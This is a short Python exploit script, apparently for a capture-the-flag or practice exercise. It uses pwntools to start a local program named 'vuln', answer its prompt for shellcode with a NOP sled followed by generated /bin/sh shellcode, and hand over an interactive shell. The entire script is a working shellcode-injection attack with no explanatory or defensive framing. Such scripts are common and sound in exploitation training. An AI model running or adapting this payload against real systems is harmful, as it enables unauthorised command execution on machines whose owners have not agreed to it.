#!/usr/bin/env python

from pwn import *

r = process("./vuln")
r.recvuntil("Enter your shellcode:\n")
payload = (
    "\x90" * 256 +
    asm(shellcraft.sh())
)
r.sendline(payload)
r.interactive()
r.close()
